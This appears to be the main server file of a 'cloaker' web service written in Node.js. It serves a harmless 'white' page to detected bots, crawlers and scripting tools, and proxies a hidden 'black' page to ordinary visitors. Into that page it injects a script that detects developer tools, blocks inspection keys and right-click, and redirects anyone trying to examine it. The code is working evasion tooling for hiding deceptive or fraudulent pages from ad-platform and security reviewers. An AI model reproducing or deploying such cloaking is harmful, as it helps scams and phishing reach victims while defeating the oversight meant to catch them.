require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const axios = require("axios");
const Domain = require("./models/Domain");
const { isBot } = require("./utils/botDetection");
const { mutateHTMLSafe } = require("./utils/mutator");

const app = express();

app.use(cors());
app.use(helmet());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🔗 Rotas protegidas (admin, API, script, etc.)
app.use("/api/auth", require("./routes/auth.routes"));
app.use("/api/cloak", require("./routes/cloak.routes"));
app.use("/api/domain", require("./routes/domain.routes"));
app.use("/cloak/script", require("./routes/script.routes"));
app.use("/api/payload", require("./routes/payload.routes"));

// 🔌 Mongo
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("🔥 MongoDB conectado"))
  .catch(err => {
    console.error("❌ MongoDB erro:", err.message);
    process.exit(1);
  });

// 🧠 Proxy inteligente sem FP/token
app.use(async (req, res, next) => {
  const host = req.hostname;
  const ua = req.headers["user-agent"] || "";
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const ref = req.get("referer") || '';
  const path = req.originalUrl;

  try {
    const domain = await Domain.findOne({ officialUrl: `https://${host}` });
    if (!domain) return res.redirect("https://google.com");

    // 👾 Se for bot → página white
    if (isBot(ua, ip)) {
      console.log("🤖 BOT detectado:", ua);
      return res.redirect(domain.baseUrl);
    }

    // 🕵️‍♂️ Anti-headless & DevTools
    if (
      ua.length < 20 ||
      /Headless|Puppeteer|Scrapy|curl|python|Go-http/i.test(ua)
    ) {
      console.log("🧪 Headless/Tool detectado:", ua);
      return res.redirect(domain.fallbackUrl || "https://google.com");
    }

    // 🌐 Redireciona para página real (BLACK) e injeta anti-devtools
    const targetUrl = domain.realUrl + path;
    const headers = {
      "User-Agent": ua,
      "X-Forwarded-For": ip,
      Referer: ref,
    };

    const response = await axios.get(targetUrl, { headers });
    let html = mutateHTMLSafe(response.data);

    // 🚫 Script anti-devtools
    const antiDevScript = `
      <script>
        function devtoolsDetector(){
          const s = performance.now(); debugger; const e = performance.now();
          if(e - s > 100) window.location.href='${domain.fallbackUrl || 'https://google.com'}';
        }
        setInterval(devtoolsDetector, 1000);
        document.addEventListener('keydown', function(e){
          if(e.key === 'F12' || 
             (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) || 
             (e.ctrlKey && e.key === 'U')){
            e.preventDefault();
            window.location.href='${domain.fallbackUrl || 'https://google.com'}';
          }
        });
        document.addEventListener('contextmenu', e => {
          e.preventDefault();
          alert("🚫 Proibido clonar!");
        });
      </script>
    `;

    html = html.replace("</body>", `${antiDevScript}</body>`);
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    return res.send(html);

  } catch (err) {
    console.error("❌ Erro proxy blindado:", err.message);
    return res.redirect("https://google.com");
  }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`🚀 Cloaker degenerado rodando na porta ${PORT}`);
});
